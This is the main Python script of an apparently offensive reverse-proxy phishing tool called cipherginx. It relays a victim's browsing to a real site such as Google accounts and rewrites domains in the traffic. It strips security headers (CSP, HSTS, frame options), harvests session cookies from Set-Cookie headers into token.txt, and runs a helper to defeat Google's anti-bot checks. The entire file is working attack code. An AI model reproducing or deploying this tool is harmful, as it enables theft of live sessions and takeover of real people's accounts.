#! /usr/bin/env python3
 
# from os import execlpe
import subprocess
import requests, json, time, re
from datetime import datetime
from sys import exit, platform
import argparse, logging, ssl
from http.cookies import SimpleCookie
from helper import *
from http.server import HTTPServer,BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# from urllib.parse import unquote, quote_plus

VERSION = 'v1.4'
CONFIG = ''
LEVEL = ''

def banner():
    bnr = RED + ''' 
             (      (         )         (               (         )      )  
       (     )\ )   )\ )   ( /(         )\ )   (        )\ )   ( /(   ( /(  
       )\   (()/(  (()/(   )\())  (    (()/(   )\ )    (()/(   )\())  )\()) 
     (((_)   /(_))  /(_)) ((_)\   )\    /(_)) (()/(     /(_)) ((_)\  ((_)\  
     )\___  (_))   (_))    _((_) ((_)  (_))    /(_))_  (_))    _((_) __((_) ''' + GREEN + '''
    '''+RED+'''(('''+GREEN+'''/ __| |_ _|  | _ \  | || | | __| | _ \  '''+RED+'''(_)'''+GREEN+''') __| |_ _|  | \| | \ \/ / '''+PURPLE+'''
     | (__   | |   |  _/  | __ | | _|  |   /    | (_ |  | |   | .` |  >  <  '''+GREEN+'''
      \___| |___|  |_|    |_||_| |___| |_|_\     \___| |___|  |_|\_| /_/\_\                                    
    '''+RED+'''  ====================================================================='''
    by = '''
	+-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+	
	|C| |i| |p| |h| |e| |r| |a| |s|
	+-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+'''
    print(GREEN + bnr + RESET)
    print(CYAN + '\tCreated by: ' + GREEN + by + RESET)
    print(CYAN + '\tVersion:  -~{ ' + RED + VERSION +  CYAN + ' }~-\n' + RESET)
    time.sleep(1)

def flags():
    description = BLUE+'['+GREEN+'+'+BLUE+'] Setup host, port, server & other details in config & run '+GREEN+'"sudo cipherginx.py config_name.py"'+BLUE+' to start the server' + RESET
    epilog = BLUE+'['+GREEN+'+'+BLUE+'] To use your own cert put it in the cert folder with name '+GREEN+'"server.pem"'+RESET
    parser = argparse.ArgumentParser(description=description, epilog=epilog)
    parser.add_argument('config', nargs='?' ,  help='select config to run')
    parser.add_argument('-v', '--version', help='show tool version', action='store_true')
    parser.add_argument('-l', '--level', help='logging level', choices=['info','debug','error'], default='info')
    args = parser.parse_args()
    if args.version:
        print(BLUE  + VERSION + RESET)
        exit(0)
    elif args.config:
        global CONFIG 
        CONFIG = args.config
    else:
        h = BLUE+'''
                      .--,       .--,
                    ( (  \.---./  ) )
                     '.__/o   o\__.'
                        {=  ^  =}
                         >  -  <
     ________________.""`-------`"".________________
    /                                               \\
    \ '''+GREEN+'''\t\t    Check -h or --help'''+BLUE+'''\t\t    /
    /                                               \\
    \_______________________________________________/
                       ___)( )(___
                      (((__) (__)))
        '''+RESET
        print(h)
        exit(0)

    if args.level:
        global LEVEL
        LEVEL = args.level

def checkUpdate():
    try:
        logging.info('checking for updates')
        resp = requests.get('https://api.github.com/repos/cipheras/cipherginx/releases').json()
        version = resp[0]['tag_name']
        release_name = resp[0]['name']
        if version != VERSION:
            print(BLUE+'['+GREEN+'+'+BLUE+'] Update available...'+BLINK+GREEN+version+' ['+release_name+']'+RESET)
    except Exception as e:
        logging.warning(RED + 'failed to get update info')
        logging.debug(e, exc_info=True)

def injectHeaders(oreq_header, url, post_body_len, path):
    str_req_header = str(oreq_header)
    for h in inject_domain:
        str_req_header = str_req_header.replace(h[1],h[0])
    oreq_header = eval(str_req_header)
    for _ in req_headers:
        if _[0] in path:
            oreq_header.update(_[1])
    print('\n##################### Proxy --request[injected]--> Host #####################')
    for k,v in list(oreq_header.items()):
        if k.lower()=='content-length' and v != '#':
            oreq_header.update({k:post_body_len})
        oreq_header.pop(k) if v=='#' else print(CYAN, k, ':', v, RESET)
    print(YELLOW + 'Injected headers in: ' + RESET + url)
    return oreq_header

def injectRespHeaders(header, path):
    for _ in resp_headers:
        if _[0] in path:
            header.update(_[1])
            for k,v in _[1].items():
                if v=='#': header.pop(k)
    return header

def injectReqBody(post_body, path):
    print(YELLOW + 'Injecting body in path:' + RESET)
    print(path)
    for d in inject_domain:
        post_body = str(post_body).replace(d[1],d[0])
    for _ in req_body:
        if _[0] in path: 
            post_body = re.sub(_[1], _[2], post_body)
    print(BLUE, post_body, RESET)
    return eval(post_body)

def injectRespBody(resp, path):
    for d in inject_domain:
        resp = str(resp).replace(d[0],d[1])
    for _ in resp_body:
        if _[0] in path:
            resp = resp.replace(_[1],_[2])
            print(YELLOW + 'Replaced {' + _[1] + '} with {' + _[2] + '}' + RESET)
    return eval(resp)

def blockPaths(path):   
    if path.split('?')[0] in block_paths or path in block_paths:
        print(YELLOW, 'Blocked path:', path, RESET)
        return True
    return False

def parseCookie(cookie):
    cl = []
    for k,v in SimpleCookie(cookie).items():
        cook = {}
        if k in get_cookie: 
            cook['name'] = k
            cook['value'] = v.value
            cook['domain'] = v['domain']
            cook['path'] = v['path']
            try:
                ts = datetime.strptime(v['expires'], '%a, %d-%b-%Y %H:%M:%S GMT').timestamp()
            except Exception as e:
                ts = v['expires']
                logging.warning(RED + 'different timestamp format, sending raw timestamp')
                logging.debug(e, exc_info=True)
                pass
            cook['expirationDate'] = int(ts) 
            cl.append(cook)
    print(BGORANGE + json.dumps(cl) + RESET)
    try:
        with open('token.txt', 'a') as f:
            f.write(json.dumps(cl) + '\n')
    except Exception as e:
        logging.error(RED + 'failed to write cookies')
        logging.debug(e, exc_info=True)

class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
    # protocol_version = 'HTTP/2.0' 
    s = requests.Session()
    
    def do_HEAD(self):
        self.do_GET(body=False)
    
    def do_GET(self, body=True):
        sent = False
        try:
            logging.info('path::' + self.path)
            if blockPaths(self.path): return
            hn = hostname
            for _ in req_headers:
                if _[0] in self.path:
                        for k,v in _[1].items():
                            if k=='Host': hn=v
            url = 'https://' + hn + self.path.replace(domain,hostname.split('.',1)[1])
            # Parse request
            print('\n//'+self.command)
            print(LIGHTGREEN + url + RESET)
            req_header = self.parseHeaders()
            # Call the target hostname
            resp = self.s.get(url, headers=injectHeaders(req_header, url, self.headers['Content-Length'], self.path), verify=False, allow_redirects=True,)
            sent = True
            if resp.history:
                for r in resp.history:
                    print('Redirection: '+BOLD+CYAN+'[',r.status_code,'] ',r.url, RESET)
            # Respond with the requested data
            self.sendRespHeaders(resp)
            if body:
                inj_resp = injectRespBody(resp.content, self.path)
                self.send_header('Content-Length', len(inj_resp))
                self.end_headers()
                self.wfile.write(inj_resp)
            else:
                self.send_header('Content-Length', len(resp.content))
                self.end_headers()
            return
        except Exception as e:
            logging.error(RED + str(e))
            logging.debug(e, exc_info=True)
            # exit()
        finally:
            # self.finish()
            if not sent:
                self.send_error(200, 'No Content')
                logging.info('sending [200] with no content to target')

    def do_POST(self, body=True):
        sent = False
        try:
            logging.info('path::'+self.path)
            if blockPaths(self.path): return
            hn = hostname
            for _ in req_headers:
                if _[0] in self.path:
                        for k,v in _[1].items():
                            if k=='Host': hn=v
            url = 'https://' + hn + self.path.replace(domain,hostname.split('.',1)[1])
            # Parse request
            print('\n//'+self.command)
            print(LIGHTGREEN + url + RESET)
            req_header = self.parseHeaders()
            # content-length injection
            if self.headers['Content-Length'] == None:
                content_len = 0
            else:
                content_len = int(self.headers['Content-Length'])
            post_body = self.rfile.read(content_len)
            print(GREEN, post_body, RESET)
            ## google-anti-botguard
            if '/accountlookup' in self.path:
                token = requests.get("http://localhost:8081?e="+re.findall('f.req=%5B%22.*?%22',str(post_body))[0].split('%22')[1]).text
                post_body = re.sub(b'identifier%22%2C%22%3C.*%22', b'identifier%22%2C%22%3C'+bytes(token,encoding='utf8')+b'%22', post_body)
            ##
            injbody = injectReqBody(post_body, self.path)
            # Call the target hostname
            resp = self.s.post(url, data=injbody, headers=injectHeaders(req_header, url, str(len(injbody)), self.path), verify=False,)
            sent = True
            if resp.history:
                for r in resp.history:
                    print('Redirection: ' +BOLD+CYAN+ '[',r.status_code,'] ',r.url, RESET)
            print(BGGREEN + str(resp.content) + RESET)
            # Respond with the requested data 
            self.sendRespHeaders(resp)
            if body:
                inj_resp = injectRespBody(resp.content,self.path)
                print(BGBLUE + str(inj_resp) + RESET)
                self.send_header('Content-Length', len(inj_resp))
                self.end_headers()
                self.wfile.write(inj_resp)
            else:
                self.send_header('Content-Length', len(resp.content))
                self.end_headers()
            return
        except Exception as e:
            logging.error(RED + str(e))
            logging.debug(e, exc_info=True)
            # exit()
        finally:
            # self.finish()
            if not sent:
                self.send_error(200, 'No Content')
                logging.info('sending [200] with no content to target')
    
    def parseHeaders(self):
        req_header = {}
        print('##################### Client --request--> Proxy #####################')
        for k,v in self.headers.items():
            print(CYAN, k, ':', v, RESET)
            req_header[k] = v
        return req_header

    def sendRespHeaders(self, resp):
        print('\n##################### Host --response--> Proxy --> Client #####################')
        self.send_response(resp.status_code)
        hl = ['content-encoding', 'transfer-encoding', 'content-length', 'x-frame-options', 'x-content-type-options', 'content-security-policy', 'content-security-policy-report-only', 'strict-transport-security', 'x-xss-protection']
        for k,v in injectRespHeaders(resp.headers, self.path).items():
            if k.lower() not in hl:
                for h in inject_domain:
                    v = v.replace(h[0],h[1]) 
                print(CYAN, k, ':', v, RESET)
                self.send_header(k,v)
                if k=='Set-Cookie':
                    parseCookie(v)
               
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
  """ Make our HTTP server multi-threaded """

def runServer():
    try:
        logging.captureWarnings(True)
        logging.info('HTTP server is starting on port ' + str(port))
        server_address = (server, port)
        # httpd = HTTPServer(server_address, ProxyHTTPRequestHandler)
        httpd = ThreadedHTTPServer(server_address, ProxyHTTPRequestHandler)
        if isSSL:
            httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='cert/server.pem')
        if hostname=="accounts.google.com":
            subprocess.Popen(['bin/generate.exe']) if platform=='win32' else subprocess.Popen(['bin/generate'])
        logging.info('HTTP server is running as reverse proxy')
        httpd.serve_forever()
    except KeyboardInterrupt:
        logging.info('\nExiting...')
        logging.debug('ctrl + c pressed')
        httpd.server_close()
        time.sleep(1)
        print(CLEAR)
        exit(0)
    except Exception as e:
        logging.error(RED + str(e))
        logging.debug('check domain name and ssl cert', exc_info=True)

if __name__ == '__main__':
    cwin()
    flags()
    if LEVEL=='error':
        logging.basicConfig(format=PURPLE + '## %(asctime)s [%(levelname)s] - %(message)s' + RESET, level=logging.ERROR,)
    elif LEVEL=='debug':
        logging.basicConfig(format=PURPLE + '## %(asctime)s [%(levelname)s] - %(message)s' + RESET, level=logging.DEBUG,)
    else:
        logging.basicConfig(format=PURPLE + '## %(asctime)s [%(levelname)s] - %(message)s' + RESET, level=logging.INFO,)
    banner()
    checkUpdate()
    try:
        logging.info('loading config ' + CONFIG)
        exec('from config.' + CONFIG + ' import *')
    except Exception as e:
        logging.error(RED + 'no such config found' + RESET)
        logging.debug(e, exc_info=True)
        exit(1)
    runServer()